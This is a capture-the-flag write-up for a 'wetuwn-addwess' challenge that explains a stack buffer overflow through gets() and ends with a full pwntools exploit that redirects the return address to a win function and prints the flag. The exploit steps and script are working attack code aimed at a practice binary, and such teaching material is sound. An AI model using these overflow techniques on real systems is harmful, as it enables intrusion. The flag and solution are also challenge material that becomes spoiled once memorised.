# wetuwn-addwess

## Challenge

The program asks for our name, then repeats our name and prints the return address.

```
What's your name?
Green-Avocado
Hello Green-Avocado! Let's go to 0x681d73df1b25
```

### Mitigations

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## Solution

We have an unsafe call to `gets`, similar to the "owoverflow" challenge.
However, this time there are no other stack variables to overwrite.

If we disassemble the `main` function:

```asm
┌ 205: int main (int64_t argc);
│           ; var char *s @ rbp-0x30
│           ; var file*stream @ rbp-0x8
│           ; arg int64_t argc @ rbp+0x8
```

we see that te variables are arranged as follows:

```
(40) name
 (8) flagfile
 (8) saved RBP
 (8) saved RIP
```

There is no canary, so we can overwrite the saved RBP and RIP.

The saved RIP is important as it determines where to execute instructions from when we return.
Normally, this would be in the caller function.
If we overwrite this saved value, we can choose what address to return to.

The function prints the return address before it returns.
If we write 56 bytes of padding, we can overwrite the saved RIP with the next 8 bytes:

```
$ ./wetuwn-addwess                       
What's your name?
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaAAAAAAAA
Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaAAAAAAAA! Let's go to 0x4141414141414141
```

We successfully controlled the return address and changed it to 0x4141414141414141!

Note that there is a `win` function which prints the flag:

```c
void win() {
    puts(flag);
}
```

If we can change the return address to go to this function, it'll print the flag.
Let's get the address of this function:

Using objdump:

```
$ objdump -t wetuwn-addwess | grep win  
0000000000401216 g     F .text	0000000000000017              win
```

Using radare2:

```
$ r2 wetuwn-addwess
 -- There's a branch for that.
[0x00401130]> aa
[x] Analyze all flags starting with sym. and entry0 (aa)
[0x00401130]> afl~win
0x00401216    1 23           sym.win
```

Using pwntools:

```py
>>> from pwn import *
>>> exe = ELF('wetuwn-addwess')
[*] '/home/greenavocado/Documents/CTF/ubcmaplectf2022/pwn/wetuwn-addwess/wetuwn-addwess'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
>>> exe.sym['win']
4198934
>>> hex(_)
'0x401216'
```

Note tha PIE is disabled.
We can use these addresses as is, since the base address won't be randomized.

Let's pack the address of `win` and send it at an offset of 56 bytes:

```py
>>> from pwn import *
>>> exe = ELF('wetuwn-addwess')
>>> payload = flat({ 56: p64(exe.sym['win']) })
>>> io = exe.process()
[x] Starting local process '/home/greenavocado/Documents/CTF/ubcmaplectf2022/pwn/wetuwn-addwess/wetuwn-addwess'
[+] Starting local process '/home/greenavocado/Documents/CTF/ubcmaplectf2022/pwn/wetuwn-addwess/wetuwn-addwess': pid 2172632
>>> io.sendline(payload)
>>> io.interactive()
[*] Switching to interactive mode
[*] Process '/home/greenavocado/Documents/CTF/ubcmaplectf2022/pwn/wetuwn-addwess/wetuwn-addwess' stopped with exit code -11 (SIGSEGV) (pid 2172632)
What's your name?
Hello aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaa@! Let's go to 0x401216
maple{r3turn_t0_w1n}

[*] Got EOF while reading in interactive
```

We successfully overwrite the return address with the address of our win function and got the flag!

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 1339 ret2win
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('wetuwn-addwess')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'localhost'
port = int(args.PORT or 1339)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

payload = flat({
    0x30 + 0x8: exe.sym['win'],
    })

io.sendlineafter(b"What's your name?", payload)

io.interactive()
```

## Flag

```
maple{r3turn_t0_w1n}
```
